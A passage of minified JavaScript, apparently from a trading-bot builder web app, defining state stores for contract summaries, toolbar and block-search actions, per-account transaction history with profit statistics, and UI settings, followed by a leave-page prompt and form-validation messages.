                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "disposeReactionsFn", void 0), (0, o._)(this, "disposeSwitchAcountListener", void 0), (0, o._)(this, "contract_info", null), (0, o._)(this, "is_loading", !1), (0, o._)(this, "indicative_movement", ""), (0, o._)(this, "profit_movement", ""), (0, o._)(this, "validation_errors", {}), (0, o._)(this, "validation_rules", (0, td.sl)()), (0, o._)(this, "contract_update_take_profit", null), (0, o._)(this, "contract_update_stop_loss", null), (0, o._)(this, "has_contract_update_take_profit", !1), (0, o._)(this, "has_contract_update_stop_loss", !1), (0, o._)(this, "contract_update_config", {}), (0, o._)(this, "profit_loss", 0), (0, o._)(this, "contract_id", null), (0, o._)(this, "profit", 0), (0, o._)(this, "indicative", 0), (0, o._)(this, "is_bot_running", !1), (0, s.rC)(this, {
                            contract_info: s.LO,
                            indicative_movement: s.LO,
                            profit_movement: s.LO,
                            validation_errors: s.LO,
                            validation_rules: s.LO,
                            contract_update_take_profit: s.LO,
                            contract_update_stop_loss: s.LO,
                            has_contract_update_take_profit: s.LO,
                            has_contract_update_stop_loss: s.LO,
                            is_bot_running: s.LO,
                            contract_update_config: s.LO,
                            contract_id: s.LO,
                            profit: s.LO,
                            indicative: s.LO,
                            is_contract_completed: s.Fl,
                            is_contract_loading: s.Fl,
                            is_contract_inactive: s.Fl,
                            is_multiplier: s.Fl,
                            clear: s.aD.bound,
                            clearContractUpdateConfigValues: s.aD.bound,
                            getLimitOrder: s.aD.bound,
                            onBotContractEvent: s.aD.bound,
                            onChange: s.aD.bound,
                            populateContractUpdateConfig: s.aD.bound,
                            setContractUpdateConfig: s.aD.bound,
                            setIsBotRunning: s.aD.bound,
                            updateLimitOrder: s.aD.bound,
                            setValidationErrorMessages: s.aD,
                            validateProperty: s.aD,
                            registerReactions: s.aD.bound
                        }), this.root_store = e, this.core = t, this.disposeReactionsFn = this.registerReactions()
                    }
                }
                class tm {
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "is_animation_info_modal_open", !1), (0, o._)(this, "is_dialog_open", !1), (0, o._)(this, "file_name", (0, c.config)().default_file_name), (0, o._)(this, "has_undo_stack", !1), (0, o._)(this, "has_redo_stack", !1), (0, o._)(this, "is_reset_button_clicked", !1), (0, o._)(this, "setResetButtonState", e => {
                            this.is_reset_button_clicked = e
                        }), (0, o._)(this, "onResetClick", () => {
                            this.is_dialog_open = !0
                        }), (0, o._)(this, "closeResetDialog", () => {
                            this.is_dialog_open = !1
                        }), (0, o._)(this, "onResetOkButtonClick", () => {
                            this.setResetButtonState(!0), (0, c.runGroupedEvents)(!1, () => {
                                this.resetDefaultStrategy()
                            }, "reset"), this.is_dialog_open = !1
                        }), (0, o._)(this, "resetDefaultStrategy", async () => {
                            var e, t, n, a;
                            let i = window.Blockly.derivWorkspace;
                            i.current_strategy_id = null === (a = window) || void 0 === a ? void 0 : null === (n = a.Blockly) || void 0 === n ? void 0 : null === (t = n.utils) || void 0 === t ? void 0 : null === (e = t.idGenerator) || void 0 === e ? void 0 : e.genUid(), await (0, c.load)({
                                block_string: i.cached_xml.main,
                                file_name: (0, c.config)().default_file_name,
                                workspace: i,
                                drop_event: null,
                                strategy_id: null,
                                from: null,
                                showIncompatibleStrategyDialog: null
                            }), i.strategy_to_load = i.cached_xml.main, this.setResetButtonState(!1)
                        }), (0, o._)(this, "loadCustomStrategy", async e => {
                            var t, n, a, i;
                            let l = window.Blockly.derivWorkspace;
                            l.current_strategy_id = null === (i = window) || void 0 === i ? void 0 : null === (a = i.Blockly) || void 0 === a ? void 0 : null === (n = a.utils) || void 0 === n ? void 0 : null === (t = n.idGenerator) || void 0 === t ? void 0 : t.genUid(), await (0, c.load)({
                                block_string: l.dollar_cached_xml[e].xml,
                                file_name: (0, c.config)().default_file_name,
                                workspace: l,
                                drop_event: null,
                                strategy_id: null,
                                from: null,
                                showIncompatibleStrategyDialog: null
                            }), l.strategy_to_load = l.cached_xml.main, this.setResetButtonState(!1)
                        }), (0, o._)(this, "onSortClick", () => {
                            let {
                                workspaces: {
                                    indentWorkspace: {
                                        x: e,
                                        y: t
                                    }
                                }
                            } = (0, c.config)();
                            window.Blockly.derivWorkspace.cleanUp(e, t)
                        }), (0, o._)(this, "onUndoClick", e => {
                            window.Blockly.Events.setGroup("undo_clicked"), window.Blockly.derivWorkspace.undo(e), window.Blockly.svgResize(window.Blockly.derivWorkspace), this.setHasRedoStack(), this.setHasUndoStack(), window.Blockly.Events.setGroup(!1)
                        }), (0, o._)(this, "onZoomInOutClick", e => {
                            let t = window.Blockly.derivWorkspace,
                                n = t.getMetrics();
                            t.zoom(n.viewWidth / 2, n.viewHeight / 2, e ? 1 : -1)
                        }), (0, o._)(this, "setHasUndoStack", () => {
                            var e, t;
                            this.has_undo_stack = (null === (t = window.Blockly.derivWorkspace) || void 0 === t ? void 0 : null === (e = t.undoStack_) || void 0 === e ? void 0 : e.length) > 0
                        }), (0, o._)(this, "setHasRedoStack", () => {
                            var e, t;
                            this.has_redo_stack = (null === (t = window.Blockly.derivWorkspace) || void 0 === t ? void 0 : null === (e = t.redoStack_) || void 0 === e ? void 0 : e.length) > 0
                        }), (0, s.rC)(this, {
                            is_animation_info_modal_open: s.LO,
                            is_dialog_open: s.LO,
                            file_name: s.LO,
                            has_undo_stack: s.LO,
                            has_redo_stack: s.LO,
                            is_reset_button_clicked: s.LO,
                            onResetClick: s.aD.bound,
                            closeResetDialog: s.aD.bound,
                            onResetOkButtonClick: s.aD.bound,
                            onUndoClick: s.aD.bound,
                            resetDefaultStrategy: s.aD.bound,
                            setHasUndoStack: s.aD.bound,
                            setHasRedoStack: s.aD.bound,
                            loadCustomStrategy: s.aD.bound
                        }), this.root_store = e
                    }
                }
                class tb {
                    onUnmount() {
                        "function" == typeof this.disposeToolboxToggleReaction && this.disposeToolboxToggleReaction()
                    }
                    setWorkspaceOptions() {
                        let e, t, n, a, i;
                        let l = window.Blockly.derivWorkspace;
                        l.options.readOnly ? (e = null, t = !1, n = !1, a = !1, i = !1) : (n = t = !!((e = this.toolbox_dom) && e.getElementsByTagName("category").length), a = t, i = t), l.options.collapse = n, l.options.comments = a, l.options.disable = i, l.options.hasCategories = t, l.options.languageTree = e
                    }
                    adjustWorkspace() {
                        !this.is_workspace_scroll_adjusted && !this.root_store.load_modal.is_load_modal_open && (this.is_workspace_scroll_adjusted = !0, setTimeout(() => {
                            var e, t;
                            let n = window.Blockly.derivWorkspace,
                                a = (null === (e = document.getElementById("gtm-toolbox")) || void 0 === e ? void 0 : e.getBoundingClientRect().width) || 0,
                                i = null === (t = n.svgBlockCanvas_) || void 0 === t ? void 0 : t.getBoundingClientRect();
                            if (n.RTL && i) {
                                let e = this.core.ui.is_mobile,
                                    t = e ? i.right : i.left,
                                    l = this.core.ui.is_mobile ? a - t + 20 : a - t + 36;
                                (Math.round(t) <= a || e) && (0, c.scrollWorkspace)(n, l, !0, !1)
                            } else if (Math.round(null == i ? void 0 : i.left) <= a) {
                                let e = this.core.ui.is_mobile ? a - i.left + 50 : a - i.left + 36;
                                (0, c.scrollWorkspace)(n, e, !0, !1)
                            }
                            this.is_workspace_scroll_adjusted = !1
                        }, 300))
                    }
                    toggleDrawer() {
                        this.is_toolbox_open = !this.is_toolbox_open
                    }
                    onToolboxItemClick(e) {
                        var t;
                        let {
                            flyout: n
                        } = this.root_store, a = e.getAttribute("id"), i = this.getCategoryContents(e);
                        n.setIsSearchFlyout(!1), (null === (t = n.selected_category) || void 0 === t ? void 0 : t.getAttribute("id")) === a ? n.setVisibility(!1) : (n.setSelectedCategory(e), n.setContents(i))
                    }
                    onToolboxItemExpand(e) {
                        if (this.sub_category_index.includes(e)) {
                            let t = this.sub_category_index.filter(t => t !== e);
                            this.sub_category_index = t
                        } else this.sub_category_index = [...this.sub_category_index, e]
                    }
                    onSearchBlur() {
                        this.is_search_focus = !1
                    }
                    onSearchClear(e) {
                        e("search", ""), this.showSearch("")
                    }
                    onSearchKeyUp(e) {
                        this.is_search_loading = !0, clearTimeout(this.typing_timer), this.typing_timer = setTimeout((0, s.aD)(() => {
                            e(), this.is_search_loading = !1
                        }), 1e3)
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "disposeToolboxToggleReaction", void 0), (0, o._)(this, "typing_timer", void 0), (0, o._)(this, "is_toolbox_open", !0), (0, o._)(this, "is_search_loading", !1), (0, o._)(this, "is_search_focus", !1), (0, o._)(this, "sub_category_index", []), (0, o._)(this, "toolbox_dom", void 0), (0, o._)(this, "toolbox_examples", void 0), (0, o._)(this, "is_workspace_scroll_adjusted", !1), (0, o._)(this, "onMount", e => {
                            var t;
                            this.adjustWorkspace(), this.toolbox_dom = window.Blockly.utils.xml.textToDom(null == e ? void 0 : e.current);
                            let n = [...(null === (t = this.toolbox_dom) || void 0 === t ? void 0 : t.childNodes) ? ? []].find(e => e instanceof HTMLElement && "examples" === e.tagName);
                            n && (this.toolbox_examples = n), this.setWorkspaceOptions(), this.disposeToolboxToggleReaction = (0, s.U5)(() => this.is_toolbox_open, e => {
                                if (e) {
                                    var t;
                                    null === eS.default || void 0 === eS.default || null === (t = eS.default.pushDataLayer) || void 0 === t || t.call(eS.default, {
                                        event: "dbot_toolbox_visible",
                                        value: !0
                                    })
                                }
                            })
                        }), (0, o._)(this, "getCategoryContents", e => {
                            let t = window.Blockly.derivWorkspace,
                                n = e.getAttribute("dynamic"),
                                a = Array.from(e.childNodes);
                            if ("string" == typeof n) {
                                let e = t.getToolboxCategoryCallback(n);
                                "VARIABLE" === n && (e = window.Blockly.DataCategory), a = e(t)
                            }
                            return a
                        }), (0, o._)(this, "getAllCategories", () => {
                            let e = [];
                            return Array.from(this.toolbox_dom.childNodes).forEach(t => {
                                e.push(t), this.hasSubCategory(t.children) && Array.from(t.children).forEach(t => {
                                    e.push(t)
                                })
                            }), e
                        }), (0, o._)(this, "hasSubCategory", e => !!Object.keys(e).filter(t => {
                            if ("CATEGORY" === e[Number(t)].tagName.toUpperCase()) return e[Number(t)]
                        }).length || !1), (0, o._)(this, "onSearch", e => {
                            let {
                                search: t = ""
                            } = e;
                            this.is_search_focus = !0, this.showSearch(t)
                        }), (0, o._)(this, "showSearch", e => {
                            let t = window.Blockly.derivWorkspace,
                                n = [],
                                a = e.replace(/\s+/g, " ").trim().toUpperCase(),
                                i = a.split(" "),
                                l = t.getVariablesOfType(""),
                                o = window.Blockly.Procedures.allProcedures(t),
                                {
                                    flyout: s
                                } = this.root_store;
                            s.setVisibility(!1);
                            let r = [(0, m.NC)("THE"), (0, m.NC)("OF"), (0, m.NC)("YOU"), (0, m.NC)("IS"), (0, m.NC)("THIS"), (0, m.NC)("THEN"), (0, m.NC)("A"), (0, m.NC)("AN")];
                            if (0 === a.length) return;
                            if (a.length <= 1 || i.every(e => r.includes(e))) {
                                s.setIsSearchFlyout(!0), s.setContents(n, e);
                                return
                            }
                            let d = this.getAllCategories().filter(e => !this.hasSubCategory(e.children)).map(e => Array.from(this.getCategoryContents(e)).filter(e => "BLOCK" === e.tagName.toUpperCase())).flat(),
                                c = function() {
                                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],
                                        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                                    !e.some(e => e === t) && e.push(t)
                                },
                                u = e => {
                                    d.forEach(t => {
                                        let l = t.getAttribute("type"),
                                            o = window.Blockly.Blocks[l],
                                            s = o.meta instanceof Function && o.meta(),
                                            r = o.definition instanceof Function && o.definition(),
                                            d = s.display_name,
                                            u = l.toUpperCase().split("_"),
                                            m = d.toUpperCase().split(" "),
                                            b = /^((message)|(tooltip)|(category))/;
                                        switch (e) {
                                            case "exact_block_name":
                                                (a === d.toUpperCase() || a === l.toUpperCase()) && c(n, t);
                                                break;
                                            case "match_words":
                                                (i.every(e => m.some(t => t.includes(e))) || i.every(e => u.some(t => t.includes(e)))) && c(n, t);
                                                break;
                                            case "block_term":
                                                (u.some(e => i.some(t => e.includes(t))) || m.some(e => i.some(t => e.includes(t)))) && c(n, t);
                                                break;
                                            case "block_definitions":
                                                Object.keys(r).forEach(e => {
                                                    let l = r[e];
                                                    b.test(e) && i.some(e => l.includes(e)) && c(n, t), l instanceof Array && l.forEach(e => {
                                                        let l = JSON.stringify(e).toUpperCase();
                                                        "field_dropdown" === e.type && a.length > 2 && i.some(e => l.includes(e)) && c(n, t)
                                                    })
                                                });
                                                break;
                                            case "block_meta":
                                                {
                                                    let e = Object.keys(s).filter(e => "display_name" !== e).find(e => {
                                                        let t = s[e].toUpperCase().replace(/[^\w\s]/gi, "").split(" ");
                                                        return i.some(e => t.some(t => t.includes(e)))
                                                    });e && e.length && c(n, t)
                                                }
                                        }
                                    })
                                };
                            ["exact_block_name", "match_words", "block_term", "block_definitions", "block_meta"].forEach(e => u(e));
                            let b = l.filter(e => e.name.toUpperCase().includes(a)),
                                p = window.Blockly.DataCategory.search(b).filter(e => -1 === n.indexOf(e));
                            p && p.length && n.unshift(...p);
                            let f = {
                                    0: [],
                                    1: []
                                },
                                _ = o[0],
                                h = o[1];
                            Object.keys(_).forEach(e => {
                                let t = _[e];
                                t[0].toUpperCase().includes(a) && f["0"].unshift(t)
                            }), Object.keys(h).forEach(e => {
                                let t = h[e];
                                t[0].toUpperCase().includes(a) && f["1"].unshift(t)
                            });
                            let v = window.Blockly.Procedures.populateDynamicProcedures(f).filter(e => -1 === n.indexOf(e));
                            v.length && n.unshift(...v), s.setIsSearchFlyout(!0), s.setContents(n, e)
                        }), (0, s.rC)(this, {
                            is_toolbox_open: s.LO,
                            is_search_loading: s.LO,
                            is_search_focus: s.LO,
                            sub_category_index: s.LO,
                            toolbox_dom: s.LO,
                            toolbox_examples: s.LO,
                            onMount: s.aD.bound,
                            onUnmount: s.aD.bound,
                            setWorkspaceOptions: s.aD.bound,
                            adjustWorkspace: s.aD.bound,
                            toggleDrawer: s.aD.bound,
                            onToolboxItemClick: s.aD.bound,
                            onToolboxItemExpand: s.aD.bound,
                            getCategoryContents: s.aD.bound,
                            getAllCategories: s.aD.bound,
                            hasSubCategory: s.aD.bound,
                            onSearch: s.aD.bound,
                            onSearchBlur: s.aD.bound,
                            onSearchClear: s.aD.bound,
                            onSearchKeyUp: s.aD.bound,
                            showSearch: s.aD.bound
                        }), this.root_store = e, this.core = t
                    }
                }
                var tp = n("33690");
                class tf {
                    get transactions() {
                        var e, t, n, a;
                        return (null === (t = this.core) || void 0 === t ? void 0 : null === (e = t.client) || void 0 === e ? void 0 : e.loginid) ? this.elements[null === (a = this.core) || void 0 === a ? void 0 : null === (n = a.client) || void 0 === n ? void 0 : n.loginid] ? ? [] : []
                    }
                    get statistics() {
                        let e = 0,
                            t = this.transactions.filter(e => e.type === tp.i.CONTRACT && "object" == typeof e.data).reduce((t, n) => {
                                let {
                                    data: a
                                } = n, {
                                    profit: i = 0,
                                    is_completed: l = !1,
                                    buy_price: o = 0,
                                    payout: s,
                                    bid_price: r,
                                    is_virtual_trade: d = !1
                                } = a;
                                return l && !d && (i > 0 ? (t.won_contracts += 1, t.total_payout += s ? ? r ? ? 0) : t.lost_contracts += 1, t.total_profit += i, t.total_stake += o, e += 1), t
                            }, {
                                lost_contracts: 0,
                                number_of_runs: 0,
                                total_profit: 0,
                                total_payout: 0,
                                total_stake: 0,
                                won_contracts: 0
                            });
                        return t.number_of_runs = e, t
                    }
                    onBotContractEvent(e) {
                        this.pushTransaction(e)
                    }
                    pushTransaction(e) {
                        var t, n, a, i, l, o, s, r, u;
                        let m = (0, d.UTW)(e),
                            {
                                run_id: b
                            } = this.root_store.run_panel,
                            p = null === (n = this.core) || void 0 === n ? void 0 : null === (t = n.client) || void 0 === t ? void 0 : t.loginid,
                            f = { ...e,
                                is_completed: m,
                                run_id: b,
                                date_start: (0, d.p6d)(e.date_start, "YYYY-M-D HH:mm:ss [GMT]"),
                                entry_tick: e.entry_tick_display_value,
                                entry_tick_time: e.entry_tick_time && (0, d.p6d)(e.entry_tick_time, "YYYY-M-D HH:mm:ss [GMT]"),
                                exit_tick: e.exit_tick_display_value,
                                exit_tick_time: e.exit_tick_time && (0, d.p6d)(e.exit_tick_time, "YYYY-M-D HH:mm:ss [GMT]"),
                                profit: m ? e.profit : 0,
                                is_virtual_trade: c.config_v1.vh_variables.is_enabled
                            };
                        !this.elements[p] && (this.elements = { ...this.elements,
                            [p]: []
                        });
                        let _ = null === (a = this.elements[p]) || void 0 === a ? void 0 : a.findIndex(t => {
                            var n, a;
                            return "string" != typeof t.data && t.type === tp.i.CONTRACT && (null === (n = t.data) || void 0 === n ? void 0 : n.transaction_ids) && t.data.transaction_ids.buy === (null === (a = e.transaction_ids) || void 0 === a ? void 0 : a.buy)
                        });
                        if (-1 === _) {
                            if ((null === (i = this.elements[p]) || void 0 === i ? void 0 : i.length) > 0) {
                                let e = null === (o = this.elements[p]) || void 0 === o ? void 0 : o[0];
                                e.type === tp.i.CONTRACT && "object" == typeof e.data && f.run_id !== (null == e ? void 0 : null === (s = e.data) || void 0 === s ? void 0 : s.run_id) && (null === (r = this.elements[p]) || void 0 === r || r.unshift({
                                    type: tp.i.DIVIDER,
                                    data: f.run_id
                                }))
                            }
                            null === (l = this.elements[p]) || void 0 === l || l.unshift({
                                type: tp.i.CONTRACT,
                                data: f
                            })
                        } else null === (u = this.elements[p]) || void 0 === u || u.splice(_, 1, {
                            type: tp.i.CONTRACT,
                            data: f
                        });
                        this.elements = { ...this.elements
                        }
                    }
                    clear() {
                        var e, t, n, a, i, l, o;
                        this.elements && (null === (e = this.elements[null === (n = this.core) || void 0 === n ? void 0 : null === (t = n.client) || void 0 === t ? void 0 : t.loginid]) || void 0 === e ? void 0 : e.length) > 0 && (this.elements[null === (o = this.core) || void 0 === o ? void 0 : null === (l = o.client) || void 0 === l ? void 0 : l.loginid] = []), this.recovered_completed_transactions = null === (a = this.recovered_completed_transactions) || void 0 === a ? void 0 : a.slice(0, 0), this.recovered_transactions = null === (i = this.recovered_transactions) || void 0 === i ? void 0 : i.slice(0, 0), this.is_transaction_details_modal_open = !1
                    }
                    registerReactions() {
                        let {
                            client: e
                        } = this.core, t = (0, s.U5)(() => this.elements[null == e ? void 0 : e.loginid], t => {
                            let n = eQ(this.TRANSACTION_CACHE, {});
                            n[e.loginid] = (null == t ? void 0 : t.slice(0, 5e3)) ? ? [], eJ(this.TRANSACTION_CACHE, n)
                        }), n = (0, s.U5)(() => this.transactions.length, () => this.recoverPendingContracts());
                        return () => {
                            t(), n()
                        }
                    }
                    recoverPendingContracts() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null;
                        this.transactions.forEach(t => {
                            let {
                                data: n
                            } = t;
                            !("string" == typeof n || (null == n ? void 0 : n.is_completed) || !(null == n ? void 0 : n.contract_id) || this.recovered_transactions.includes(null == n ? void 0 : n.contract_id)) && this.recoverPendingContractsById(n.contract_id, e)
                        })
                    }
                    updateResultsCompletedContract(e) {
                        let {
                            journal: t,
                            summary_card: n
                        } = this.root_store, {
                            contract_info: a
                        } = n, {
                            currency: i,
                            profit: l
                        } = e;
                        e.contract_id !== (null == a ? void 0 : a.contract_id) && (this.onBotContractEvent(e), e.contract_id && !this.recovered_transactions.includes(e.contract_id) && this.recovered_transactions.push(e.contract_id), e.contract_id && !this.recovered_completed_transactions.includes(e.contract_id) && (0, d.UTW)(e) && (this.recovered_completed_transactions.push(e.contract_id), t.onLogSuccess({
                            log_type: l && l > 0 ? c.LogTypes.PROFIT : c.LogTypes.LOST,
                            extra: {
                                currency: i,
                                profit: l
                            }
                        })))
                    }
                    sortOutPositionsBeforeAction(e, t) {
                        null == e || e.forEach(e => {
                            if (!t || t && e.id === t) {
                                let t = e.contract_info;
                                this.updateResultsCompletedContract(t)
                            }
                        })
                    }
                    async recoverPendingContractsById(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null,
                            n = [];
                        if (t && (this.is_called_proposal_open_contract = !0, t.contract_id === e && this.updateResultsCompletedContract(t)), !this.is_called_proposal_open_contract) {
                            var a, i, l, o, s, r;
                            if (null === (i = this.core) || void 0 === i ? void 0 : null === (a = i.client) || void 0 === a ? void 0 : a.loginid) {
                                let e = null === (o = this.core) || void 0 === o ? void 0 : null === (l = o.client) || void 0 === l ? void 0 : l.loginid;
                                !(null === (s = this.elements[e]) || void 0 === s ? void 0 : s.length) && this.sortOutPositionsBeforeAction(n);
                                let [t = null] = this.elements[e];
                                if ("object" == typeof(null == t ? void 0 : t.data) && !(null == t ? void 0 : null === (r = t.data) || void 0 === r ? void 0 : r.profit)) {
                                    let e = t.data.contract_id;
                                    this.sortOutPositionsBeforeAction(n, e)
                                }
                            }
                        }
                    }
                    constructor(e, t) {
                        var n, a;
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "disposeReactionsFn", void 0), (0, o._)(this, "TRANSACTION_CACHE", "transaction_cache"), (0, o._)(this, "elements", eq(this.TRANSACTION_CACHE, null === (a = this.core) || void 0 === a ? void 0 : null === (n = a.client) || void 0 === n ? void 0 : n.loginid, [])), (0, o._)(this, "active_transaction_id", null), (0, o._)(this, "recovered_completed_transactions", []), (0, o._)(this, "recovered_transactions", []), (0, o._)(this, "is_called_proposal_open_contract", !1), (0, o._)(this, "is_transaction_details_modal_open", !1), (0, o._)(this, "toggleTransactionDetailsModal", e => {
                            this.is_transaction_details_modal_open = e
                        }), this.root_store = e, this.core = t, this.is_transaction_details_modal_open = !1, this.disposeReactionsFn = this.registerReactions(), (0, s.rC)(this, {
                            elements: s.LO,
                            active_transaction_id: s.LO,
                            recovered_completed_transactions: s.LO,
                            recovered_transactions: s.LO,
                            is_called_proposal_open_contract: s.LO,
                            is_transaction_details_modal_open: s.LO,
                            transactions: s.Fl,
                            onBotContractEvent: s.aD.bound,
                            pushTransaction: s.aD.bound,
                            clear: s.aD.bound,
                            registerReactions: s.aD.bound,
                            recoverPendingContracts: s.aD.bound,
                            updateResultsCompletedContract: s.aD.bound,
                            sortOutPositionsBeforeAction: s.aD.bound,
                            recoverPendingContractsById: s.aD.bound
                        })
                    }
                }
                var t_ = n("77149");
                class th {
                    setIsTradingAssessmentForNewUserEnabled(e) {
                        this.is_trading_assessment_for_new_user_enabled = e
                    }
                    toggleAccountsDialog() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : !this.is_accounts_switcher_on;
                        this.is_accounts_switcher_on = e
                    }
                    toggleOnScreenKeyboard() {
                        this.is_onscreen_keyboard_active = null !== this.current_focus && this.is_mobile && (0, t_.b1)()
                    }
                    setCurrentFocus(e) {
                        this.current_focus = e, this.toggleOnScreenKeyboard()
                    }
                    setDontShowAgainDisclaimer() {
                        this.shouldShowDisclaimer = "false", localStorage.setItem("dont_show_again", "false")
                    }
                    constructor() {
                        (0, o._)(this, "is_mobile", !0), (0, o._)(this, "is_desktop", !0), (0, o._)(this, "is_tablet", !1), (0, o._)(this, "is_chart_layout_default", !0), (0, o._)(this, "is_dark_mode_on", "dark" === localStorage.getItem("theme")), (0, o._)(this, "account_switcher_disabled_message", ""), (0, o._)(this, "current_focus", null), (0, o._)(this, "show_prompt", !1), (0, o._)(this, "shouldShowDisclaimer", localStorage.getItem("dont_show_again")), (0, o._)(this, "is_trading_assessment_for_new_user_enabled", !1), (0, o._)(this, "is_accounts_switcher_on", !1), (0, o._)(this, "is_onscreen_keyboard_active", !1), (0, o._)(this, "setPromptHandler", e => {
                            this.show_prompt = e
                        }), (0, o._)(this, "setAccountSwitcherDisabledMessage", e => {
                            e ? this.account_switcher_disabled_message = e : this.account_switcher_disabled_message = ""
                        }), (0, o._)(this, "setDarkMode", e => {
                            this.is_dark_mode_on = e
                        }), (0, o._)(this, "setDevice", e => {
                            this.is_mobile = "mobile" === e, this.is_desktop = "desktop" === e, this.is_tablet = "tablet" === e
                        }), (0, s.rC)(this, {
                            account_switcher_disabled_message: s.LO,
                            current_focus: s.LO,
                            is_accounts_switcher_on: s.LO,
                            is_dark_mode_on: s.LO,
                            is_desktop: s.LO,
                            is_mobile: s.LO,
                            shouldShowDisclaimer: s.LO,
                            is_tablet: s.LO,
                            is_trading_assessment_for_new_user_enabled: s.LO,
                            show_prompt: s.LO,
                            setAccountSwitcherDisabledMessage: s.aD.bound,
                            setCurrentFocus: s.aD.bound,
                            setDarkMode: s.aD.bound,
                            setDevice: s.aD.bound,
                            setPromptHandler: s.aD.bound,
                            setDontShowAgainDisclaimer: s.aD.bound,
                            setIsTradingAssessmentForNewUserEnabled: s.aD.bound,
                            toggleAccountsDialog: s.aD.bound,
                            toggleOnScreenKeyboard: s.aD.bound
                        })
                    }
                }
                class tv {
                    constructor(e) {
                        (0, o._)(this, "dbot", void 0), (0, o._)(this, "app", void 0), (0, o._)(this, "summary_card", void 0), (0, o._)(this, "flyout", void 0), (0, o._)(this, "flyout_help", void 0), (0, o._)(this, "google_drive", void 0), (0, o._)(this, "journal", void 0), (0, o._)(this, "load_modal", void 0), (0, o._)(this, "run_panel", void 0), (0, o._)(this, "save_modal", void 0), (0, o._)(this, "transactions", void 0), (0, o._)(this, "toolbar", void 0), (0, o._)(this, "toolbox", void 0), (0, o._)(this, "quick_strategy", void 0), (0, o._)(this, "self_exclusion", void 0), (0, o._)(this, "dashboard", void 0), (0, o._)(this, "chart_store", void 0), (0, o._)(this, "blockly_store", void 0), (0, o._)(this, "data_collection_store", void 0), (0, o._)(this, "ui", void 0), (0, o._)(this, "client", void 0), (0, o._)(this, "common", void 0), (0, o._)(this, "core", {
                            ui: {},
                            client: {},
                            common: {}
                        }), this.dbot = e, this.ui = new th, this.client = new T, this.common = new w, this.core.ui = this.ui, this.core.client = this.client, this.core.common = this.common, this.app = new b(this, this.core), this.summary_card = new tu(this, this.core), this.flyout = new eC(this), this.flyout_help = new eN(this), this.google_drive = new eI(this), this.journal = new e0(this, this.core), this.load_modal = new e5(this, this.core), this.run_panel = new tn(this, this.core), this.save_modal = new to(this), this.transactions = new tf(this, this.core), this.toolbar = new tm(this), this.toolbox = new tb(this, this.core), this.quick_strategy = new e4(this), this.self_exclusion = new tr(this, this.core), this.dashboard = new D(this, this.core), this.chart_store = new h(this), this.blockly_store = new _(this), this.data_collection_store = new V(this, this.core)
                    }
                }
                var ty = n("30979");
                let tk = (0, l.createContext)(null),
                    tg = e => {
                        let {
                            children: t,
                            mockStore: n
                        } = e, [a, o] = (0, l.useState)(null), s = (0, l.useRef)(!1);
                        return ((0, l.useEffect)(() => {
                            let e = async () => {
                                o(new tv(ty.Z))
                            };
                            !a && !s.current && (s.current = !0, n ? o(n) : e())
                        }, [a, n]), !a && n) ? null : (0, i.jsx)(tk.Provider, {
                            value: a,
                            children: t
                        })
                    },
                    tT = () => (0, l.useContext)(tk)
            },
            22187: function(e, t, n) {
                "use strict";
                let a;
                var i = n("85893"),
                    l = n("20745"),
                    o = n("67294"),
                    s = n("92198"),
                    r = n("83543"),
                    d = n("87383"),
                    c = n("48059"),
                    u = n("12838"),
                    m = n("21995"),
                    b = n("79655"),
                    p = n("89250"),
                    f = n("96877"),
                    _ = n("83274"),
                    h = n("10434");
                let v = (0, f.Pi)(() => {
                    let {
                        ui: e
                    } = (0, _.oR)() ? ? {
                        ui: {
                            show_prompt: !1
                        }
                    }, {
                        show_prompt: t
                    } = e, n = (0, p._Z)(e => {
                        let {
                            currentLocation: n,
                            nextLocation: a
                        } = e;
                        return t && n.pathname !== a.pathname
                    });
                    return o.useEffect(() => {
                        let e = e => {
                            t ? e.preventDefault() : delete e.returnValue
                        };
                        return window.addEventListener("beforeunload", e), () => {
                            window.removeEventListener("beforeunload", e)
                        }
                    }, [t]), (0, i.jsx)(h.Z, {
                        title: (0, c.NC)("Leaving already?"),
                        confirm_button_text: (0, c.NC)("Yes, I'll come back later"),
                        cancel_button_text: (0, c.NC)("No, I'll stay"),
                        onConfirm: () => {
                            var e;
                            null == n || null === (e = n.proceed) || void 0 === e || e.call(n)
                        },
                        onCancel: () => {
                            var e;
                            null == n || null === (e = n.reset) || void 0 === e || e.call(n)
                        },
                        is_visible: "blocked" === n.state,
                        has_close_icon: !1,
                        children: (0, i.jsx)(c.Xx, {
                            i18n_default_text: "If you leave, your current contract will be completed, but your bot will stop running immediately."
                        })
                    })
                });
                var y = n("37979"),
                    k = n("11527"),
                    g = n("29747"),
                    T = n("66175"),
                    E = n("83606"),
                    A = n("98831"),
                    x = n("419");
                let w = () => ({
                    empty_address: () => (0, c.NC)("This field is required"),
                    empty_barrier: () => (0, c.NC)("Barrier is a required field."),
                    address: () => (0, c.NC)("Use only the following special characters: {{permitted_characters}}", {
                        permitted_characters: x.JL,
                        interpolation: {
                            escapeValue: !1
                        }
                    }),
                    barrier: () => (0, c.NC)("Only numbers and these special characters are allowed: {{permitted_characters}}", {
                        permitted_characters: "+ - ."
                    }),
                    email: () => (0, c.NC)("Invalid email address."),
                    general: () => (0, c.NC)("Only letters, numbers, space, hyphen, period, and apostrophe are allowed."),
                    name: () => (0, c.NC)("Letters, spaces, periods, hyphens, apostrophes only."),
                    password: () => (0, c.NC)("Password should have lower and uppercase English letters with numbers."),
                    po_box: () => (0, c.NC)("P.O. Box is not accepted in address"),
                    phone: () => (0, c.NC)("Please enter a valid phone number (e.g. +15417541234)."),
                    postcode: () => (0, c.NC)("Only letters, numbers, space and hyphen are allowed."),
                    signup_token: () => (0, c.NC)("The length of token should be 8."),
                    tax_id: () => (0, c.NC)("Should start with letter or number, and may contain hyphen and underscore."),
                    number: () => (0, c.NC)("Should be a valid number."),
                    decimalPlaces: e => (0, c.NC)("Up to {{decimal_count}} decimal places are allowed.", {
